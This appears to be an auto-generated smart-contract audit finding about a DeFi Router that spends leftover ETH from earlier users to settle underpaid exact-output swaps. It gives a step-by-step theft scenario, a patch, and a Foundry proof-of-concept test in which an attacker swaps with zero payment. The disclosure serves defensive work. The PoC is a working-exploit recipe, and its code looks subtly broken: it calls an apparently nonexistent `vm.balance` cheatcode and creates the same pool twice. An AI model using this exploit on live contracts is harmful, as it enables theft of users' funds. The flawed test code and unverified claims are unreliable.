## Title
Router Accumulated ETH Can Be Stolen Via Exact-Output Swaps With Zero Payment

## Summary
The Router contract's handling of negative `valueDifference` in lines 138-142 allows attackers to steal accumulated ETH from the Router's balance by executing exact-output swaps with zero msg.value, causing the Router to use leftover ETH from previous users to pay for the attacker's swap.

## Impact
**Severity**: High

## Finding Description
**Location:** [1](#0-0) 

**Intended Logic:** The code is designed to handle ETH payment for swaps where token0 is NATIVE_TOKEN_ADDRESS. When `valueDifference > 0` (user overpaid), refund the excess. When `valueDifference < 0` (user underpaid), the Router should transfer additional ETH to settle the swap.

**Actual Logic:** When `valueDifference < 0`, the Router sends ETH from its own balance to the Accountant without verifying the user actually provided that ETH. This creates a shared ETH pool where any user's leftover ETH can be consumed by subsequent swaps.

**Exploitation Path:**

1. **Setup Phase - Victim Overpays:**
   - Alice performs a swap and sends 2 ETH via `msg.value`
   - The swap only requires 1 ETH
   - Router refunds 0 ETH (or Alice doesn't call `refundNativeToken()`)
   - Router balance now contains 1 ETH from Alice

2. **Attack Phase - Steal Accumulated ETH:**
   - Bob crafts an exact-output swap of token1 where token0 is NATIVE_TOKEN_ADDRESS
   - Bob wants to receive 100 token1, which requires 1 ETH input
   - Bob calls `Router.swap()` with `msg.value = 0` ETH
   - Code flow: [2](#0-1) 
     - Since `isExactOut = true`, `value = 0`
   - The swap executes: [3](#0-2) 
     - Core.swap is called with 0 ETH
   - After swap: `balanceUpdate.delta0() = 1` (pool needs 1 ETH input)
   - valueDifference calculation: [4](#0-3) 
     - `valueDifference = 0 - 1 = -1`
   - The negative valueDifference triggers: [5](#0-4) 
     - Router sends 1 ETH from its balance (Alice's leftover) to Accountant
   - Accountant.receive() reduces debt: [6](#0-5) 

3. **Result:**
   - Bob receives 100 token1 output
   - Bob paid 0 ETH but received tokens worth 1 ETH
   - Alice's 1 ETH was stolen

4. **Attack Amplification:**
   - Bob can call `refundNativeToken()`: [7](#0-6) 
   - If Router still has ETH, Bob can drain more

**Security Property Broken:** Direct theft of user funds - users' ETH held in Router contract can be stolen by subsequent swaps without the attacker paying for them.

## Impact Explanation
- **Affected Assets**: Native ETH (NATIVE_TOKEN_ADDRESS) accumulated in the Router contract from users who overpaid and didn't immediately refund
- **Damage Severity**: Attackers can drain the entire ETH balance held by the Router contract. Since the Router is used by all users, this affects anyone who overpays on swaps. The loss is equal to `min(required_eth_for_swap, router.balance)` per attack.
- **User Impact**: Any user who performs a swap with excess ETH and doesn't immediately call `refundNativeToken()` is vulnerable. The victim's ETH becomes available for theft by any subsequent user performing an exact-output swap with zero payment.

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user can execute this attack. No special permissions required.
- **Preconditions**: 
  - Router must have accumulated ETH balance (from users who overpaid)
  - An ETH pool must exist (token0 = NATIVE_TOKEN_ADDRESS)
  - Pool must have sufficient liquidity for the swap
- **Execution Complexity**: Single transaction. Attacker calls `Router.swap()` with carefully crafted parameters (exact-output swap, msg.value=0).
- **Frequency**: Can be executed repeatedly as long as Router has ETH balance. Multiple attackers can race to drain the accumulated ETH.

## Recommendation

The Router should never rely on its own ETH balance to pay for user swaps. Instead, it should enforce that users provide sufficient ETH upfront or revert:

```solidity
// In src/Router.sol, function handleLockData, lines 134-146:

// CURRENT (vulnerable):
if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
    int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());
    
    // refund the overpaid ETH to the swapper
    if (valueDifference > 0) {
        ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
    } else if (valueDifference < 0) {
        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
    }
}

// FIXED:
if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
    int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());
    
    // refund the overpaid ETH to the swapper
    if (valueDifference > 0) {
        ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
    } else if (valueDifference < 0) {
        // User didn't send enough ETH - revert the transaction
        // Do not use accumulated ETH from Router's balance
        revert InsufficientETHProvided(uint256(-valueDifference), value);
    }
}
```

**Alternative Mitigation:** For exact-output swaps where the required ETH is unknown upfront, require users to send a maximum amount and always refund the excess in the same transaction, never accumulating ETH in the Router.

## Proof of Concept

```solidity
// File: test/Exploit_RouterETHTheft.t.sol
// Run with: forge test --match-test test_StealAccumulatedETH -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "./FullTest.sol";
import {Router, RouteNode, TokenAmount} from "../src/Router.sol";
import {NATIVE_TOKEN_ADDRESS} from "../src/math/constants.sol";
import {SqrtRatio} from "../src/types/sqrtRatio.sol";

contract Exploit_RouterETHTheft is FullTest {
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    
    function setUp() public {
        // Initialize protocol with ETH pool
        PoolKey memory poolKey = createETHPool(0, 1 << 63, 100);
        createPosition(poolKey, -100, 100, 10 ether, 10 ether);
    }
    
    function test_StealAccumulatedETH() public {
        PoolKey memory poolKey = createETHPool(0, 1 << 63, 100);
        
        // SETUP: Alice performs swap and overpays, leaving ETH in Router
        vm.deal(alice, 10 ether);
        vm.startPrank(alice);
        
        // Alice sends 2 ETH for a swap that only needs 1 ETH
        router.swap{value: 2 ether}(
            RouteNode({poolKey: poolKey, sqrtRatioLimit: SqrtRatio.wrap(0), skipAhead: 0}),
            TokenAmount({token: NATIVE_TOKEN_ADDRESS, amount: 1 ether}),
            type(int256).min
        );
        
        // Alice forgets to call refundNativeToken()
        // Router now holds 1 ETH of Alice's money
        uint256 routerBalanceBefore = address(router).balance;
        assertEq(routerBalanceBefore, 1 ether, "Router should have 1 ETH from Alice");
        vm.stopPrank();
        
        // EXPLOIT: Bob performs exact-output swap with 0 ETH
        vm.deal(bob, 0); // Bob has 0 ETH
        vm.startPrank(bob);
        
        uint256 bobBalanceBefore = token1.balanceOf(bob);
        
        // Bob wants to receive token1, needs to pay ETH but sends 0
        // Router will use Alice's leftover ETH to pay for Bob's swap
        router.swap{value: 0}(
            RouteNode({poolKey: poolKey, sqrtRatioLimit: SqrtRatio.wrap(0), skipAhead: 0}),
            TokenAmount({token: address(token1), amount: -0.5 ether}), // negative = exact output
            type(int256).min
        );
        
        uint256 bobBalanceAfter = token1.balanceOf(bob);
        
        // VERIFY: Bob received tokens without paying any ETH
        assertGt(bobBalanceAfter, bobBalanceBefore, "Bob should have received token1");
        assertEq(vm.balance(bob), 0, "Bob still has 0 ETH - paid nothing");
        
        // Router's ETH was consumed to pay for Bob's swap
        uint256 routerBalanceAfter = address(router).balance;
        assertLt(routerBalanceAfter, routerBalanceBefore, "Router ETH was consumed");
        
        vm.stopPrank();
        
        // Alice's ETH was stolen by Bob
        console.log("Alice's ETH stolen:", routerBalanceBefore - routerBalanceAfter);
        console.log("Bob received tokens for free:", bobBalanceAfter - bobBalanceBefore);
    }
}
```

## Notes

The vulnerability exists because the Router acts as a shared wallet for all users' ETH. The design assumes users will immediately call `refundNativeToken()` after overpaying, but this is not enforced and creates a race condition where the first subsequent swap can consume the accumulated ETH.

The root cause is in the handling of exact-output swaps where token0 is ETH: the calculation of `value` is 0 for these swaps [2](#0-1) , but the swap still requires ETH input. The code incorrectly assumes the Router's balance is from the current user's `msg.value`, when it may actually be leftover ETH from previous users.

This vulnerability can be triggered in both `CALL_TYPE_SINGLE_SWAP` and potentially in `CALL_TYPE_MULTIHOP_SWAP` flows where ETH is the input token.

### Citations

**File:** src/Router.sol (L106-110)
```text
                uint256 value = FixedPointMathLib.ternary(
                    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
                    uint128(params.amount()),
                    0
                );
```

**File:** src/Router.sol (L114-114)
```text
                (PoolBalanceUpdate balanceUpdate,) = _swap(value, poolKey, params);
```

**File:** src/Router.sol (L135-135)
```text
                            int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());
```

**File:** src/Router.sol (L138-142)
```text
                            if (valueDifference > 0) {
                                ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
                            } else if (valueDifference < 0) {
                                SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
                            }
```

**File:** src/base/FlashAccountant.sol (L384-392)
```text
    receive() external payable {
        uint256 id = _getLocker().id();

        // Note because we use msg.value here, this contract can never be multicallable, i.e. it should never expose the ability
        //      to delegatecall itself more than once in a single call
        unchecked {
            // We assume msg.value will never exceed type(uint128).max, so this should never cause an overflow/underflow of debt
            _accountDebt(id, NATIVE_TOKEN_ADDRESS, -int256(msg.value));
        }
```

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```
